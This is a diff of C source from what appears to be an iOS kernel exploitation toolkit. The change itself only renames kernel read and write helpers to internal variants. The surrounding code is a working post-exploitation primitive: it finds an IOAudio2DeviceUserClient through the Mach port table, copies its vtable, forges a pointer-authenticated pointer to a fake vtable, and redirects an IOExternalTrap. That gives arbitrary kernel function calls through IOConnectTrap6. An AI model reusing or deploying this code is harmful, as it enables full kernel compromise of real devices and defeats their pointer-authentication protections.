@@ -44,23 +44,23 @@ bool
 kernel_ipc_port_lookup(uint64_t task, mach_port_name_t port_name,
 		uint64_t *ipc_port, uint64_t *ipc_entry) {
 	// Get the task's ipc_space.
-	uint64_t itk_space = kernel_read64(task + _koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
+	uint64_t itk_space = kernel_read64_internal(task + _koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
 	// Get the size of the table.
-	uint32_t is_table_size = kernel_read32(itk_space + _koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE_SIZE));
+	uint32_t is_table_size = kernel_read32_internal(itk_space + _koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE_SIZE));
 	// Get the index of the port and check that it is in-bounds.
 	uint32_t port_index = MACH_PORT_INDEX(port_name);
 	if (port_index >= is_table_size) {
 		return false;
 	}
 	// Get the space's is_table and compute the address of this port's entry.
-	uint64_t is_table = kernel_read64(itk_space + _koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
+	uint64_t is_table = kernel_read64_internal(itk_space + _koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
     uint64_t entry = is_table + port_index * 0x18; //SIZE(ipc_entry);
 	if (ipc_entry != NULL) {
 		*ipc_entry = entry;
 	}
 	// Get the address of the port if requested.
 	if (ipc_port != NULL) {
-        *ipc_port = kernel_read64(entry + 0x0);//OFFSET(ipc_entry, ie_object));
+        *ipc_port = kernel_read64_internal(entry + 0x0);//OFFSET(ipc_entry, ie_object));
 	}
 	return true;
 }
@@ -133,9 +133,9 @@ stage0_find_user_client_trap() {
 	bool ok = kernel_ipc_port_lookup(current_task, connection, &user_client_port, NULL);
 	assert(ok);
 	// Get the address of the IOAudio2DeviceUserClient.
-	user_client = kernel_read64(user_client_port + _koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
+	user_client = kernel_read64_internal(user_client_port + _koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
 	// Get the address of the IOExternalTrap.
-	trap = kernel_read64(user_client + OFFSET(IOAudio2DeviceUserClient, traps));
+	trap = kernel_read64_internal(user_client + OFFSET(IOAudio2DeviceUserClient, traps));
 	DEBUG_TRACE(2, "%s is at 0x%016llx", "IOExternalTrap", trap);
 }
 
@@ -169,7 +169,7 @@ stage0_allocate_kernel_buffer() {
 static uint64_t
 kernel_read_vtable_method(uint64_t vtable, size_t index) {
 	uint64_t vmethod_address = vtable + index * sizeof(uint64_t);
-	return kernel_read64(vmethod_address);
+	return kernel_read64_internal(vmethod_address);
 }
 
 /*
@@ -182,12 +182,12 @@ kernel_read_vtable_method(uint64_t vtable, size_t index) {
 static uint64_t *
 stage2_copyout_user_client_vtable() {
 	// Get the address of the vtable.
-	original_vtable = kernel_read64(user_client);
+	original_vtable = kernel_read64_internal(user_client);
 	uint64_t original_vtable_xpac = kernel_xpacd(original_vtable);
 	// Read the contents of the vtable to local buffer.
 	uint64_t *vtable_contents = malloc(max_vtable_size);
 	assert(vtable_contents != NULL);
-	kernel_read(original_vtable_xpac, vtable_contents, max_vtable_size);
+	kernel_read_internal(original_vtable_xpac, vtable_contents, max_vtable_size);
 	return vtable_contents;
 }
 
@@ -237,16 +237,16 @@ stage2_patch_user_client_vtable(uint64_t *vtable) {
 static void
 stage2_patch_user_client(uint64_t *vtable, size_t count) {
 	// Write the vtable to the kernel buffer.
-	kernel_write(kernel_buffer, vtable, count * sizeof(*vtable));
+	kernel_write_internal(kernel_buffer, vtable, count * sizeof(*vtable));
 	// Overwrite the user client's registry entry ID to point to the IOExternalTrap.
 	uint64_t reserved_field = user_client + OFFSET(IORegistryEntry, reserved);
-	uint64_t reserved = kernel_read64(reserved_field);
+	uint64_t reserved = kernel_read64_internal(reserved_field);
 	uint64_t id_field = reserved + OFFSET(IORegistryEntry__ExpansionData, fRegistryEntryID);
-	kernel_write64(id_field, trap);
+	kernel_write64_internal(id_field, trap);
 	// Forge the pacdza pointer to the vtable.
 	uint64_t vtable_pointer = kernel_forge_pacda(kernel_buffer, 0);
 	// Overwrite the user client's vtable pointer with the forged pointer to our fake vtable.
-	kernel_write64(user_client, vtable_pointer);
+	kernel_write64_internal(user_client, vtable_pointer);
 }
 
 /*
@@ -258,7 +258,7 @@ stage2_patch_user_client(uint64_t *vtable, size_t count) {
 static void
 stage2_unpatch_user_client() {
 	// Write the original vtable pointer back to the user client.
-	kernel_write64(user_client, original_vtable);
+	kernel_write64_internal(user_client, original_vtable);
 }
 
 // ---- API ---------------------------------------------------------------------------------------
@@ -292,7 +292,7 @@ stage1_kernel_call_deinit() {
 		// Zero out the trap.
 		uint8_t trap_data[SIZE(IOExternalTrap)];
 		memset(trap_data, 0, SIZE(IOExternalTrap));
-		kernel_write(trap, trap_data, SIZE(IOExternalTrap));
+		kernel_write_internal(trap, trap_data, SIZE(IOExternalTrap));
 		trap = 0;
 	}
 	if (kernel_buffer != 0) {
@@ -329,7 +329,7 @@ stage1_kernel_call_7v(uint64_t function, size_t argument_count, const uint64_t a
 	FIELD(trap_data, IOExternalTrap, object,   uint64_t) = args[0];
 	FIELD(trap_data, IOExternalTrap, function, uint64_t) = function;
 	FIELD(trap_data, IOExternalTrap, offset,   uint64_t) = 0;
-	kernel_write(trap, trap_data, SIZE(IOExternalTrap));
+	kernel_write_internal(trap, trap_data, SIZE(IOExternalTrap));
 	// Perform the function call.
 	uint32_t result = IOConnectTrap6(connection, 0,
 			args[1], args[2], args[3], args[4], args[5], args[6]);
